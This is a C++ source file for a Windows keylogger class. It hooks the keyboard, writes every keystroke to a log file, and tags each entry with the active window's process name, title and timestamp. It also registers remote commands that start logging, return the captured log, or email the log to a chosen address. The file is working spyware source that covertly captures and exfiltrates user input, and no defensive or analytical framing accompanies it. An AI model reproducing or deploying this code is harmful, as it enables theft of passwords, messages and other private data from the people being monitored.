#include "stdafx.h"
#include "Keylogger.h"


Keylogger::Keylogger() {
	CommandParser::addCommand(L"email", [this](std::wstring argStr) {
		bool result = this->sendEmailReport(argStr, false);
		auto receiverStr = argStr == L"" ? L"default receiver" : argStr;
		if (result) {
			return L"Report to " + receiverStr + L" successfully sent";
		} else {
			return L"Can't send report to " + receiverStr;
		}
	});
	CommandParser::addCommand(L"on", [this](std::wstring argStr) {
		this->start();
		return L"Logging started successfully";
	});
	CommandParser::addCommand(L"off", [this](std::wstring argStr) {
		//this->stop();
		return L"Not working for now";
	});
	CommandParser::addCommand(L"get", [this](std::wstring argStr) {
		logFile.close();
		std::ifstream logData;
		logData.open(this->FILENAME, std::ios::in);
		std::wstring data((std::istreambuf_iterator<char>(logData)),
			std::istreambuf_iterator<char>());
		logData.close();
		logFile.open(this->FILENAME, std::ios::app);
		return data;
	});
	CommandParser::addCommand(L"block", [this](std::wstring argStr) {
		return L"Not implemented now";
	});

	
	this->isActive = false;
	hook = make_shared<Hook>();
}

void Keylogger::start() {
	if (!this->isActive) {
		hook->setHook([this](const wchar_t key[]) {
			keyboardHandler(key);
		});

		logFile.open(FILENAME, std::ios::app);
		this->isActive = true;
	}
}

void Keylogger::keyboardHandler(const wchar_t* keyText) {
	addWindowTimeStamps();
		
	auto symbol = keyText;
	logFile << StringUtilities::wstrToChars(keyText) << std::flush;
	std::cout << StringUtilities::wstrToChars(keyText) << std::flush;
}

void Keylogger::addWindowTimeStamps() {
	// Get window title and write it to file
	HWND currentWindow = GetForegroundWindow();
	if (currentWindow != lastActiveWindow) {
		lastActiveWindow = currentWindow;

		const int bufferSize = 1024;
		wchar_t bufferProcessName[bufferSize];
		wchar_t bufferTitle[bufferSize];

		// Get process name
		DWORD processId;
		GetWindowThreadProcessId(currentWindow, &processId);
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
		GetModuleFileNameEx(hProcess, NULL, bufferProcessName, bufferSize);

		// Get windows title
		GetWindowText(currentWindow, bufferTitle, bufferSize);

		tm* localTime;
		time_t t = time(NULL);
		localTime = localtime(&t);
		char timeStrBuffer[80];
		strftime(timeStrBuffer, 80, "%F %X", localTime);

		if (bufferTitle == nullptr || bufferTitle[0] == '\0') {
			std::cout << "!!!!ploho!!!";
		} else {
			std::cout << "\n### " << StringUtilities::wstrToChars(bufferProcessName) <<
				" --- " << StringUtilities::wstrToChars(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
		}

		logFile << "\n### " << StringUtilities::wstrToChars(bufferProcessName) << " --- " <<
			StringUtilities::wstrToChars(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
	}
}

void Keylogger::stop() {
	if (this->isActive) {
		hook->unsetHook();
		logFile.close();
		this->isActive = false;
	}
}

Keylogger::~Keylogger() {
	stop();
}

bool Keylogger::sendEmailReport(std::wstring emailTo, bool deleteLocal) {
	auto emailService = make_shared<EmailService>();

	// Create email subject
	std::wstringstream subject;
	subject << "Keylogger report. " << "Compname";

	// Create email body
	logFile.close();
	std::ifstream logData;
	logData.open(this->FILENAME, std::ios::in);
	std::wstring body((std::istreambuf_iterator<char>(logData)),
		std::istreambuf_iterator<char>());
	logData.close();

	bool sendEmailResult = emailService->sendEmail(subject.str(), body, emailTo);

	if (!sendEmailResult) {
		return false;
	}

	auto openMode = deleteLocal ? std::ios::trunc : std::ios::app;
	logFile.open(this->FILENAME, openMode);

	this->lastActiveWindow = nullptr;
	return true;
}
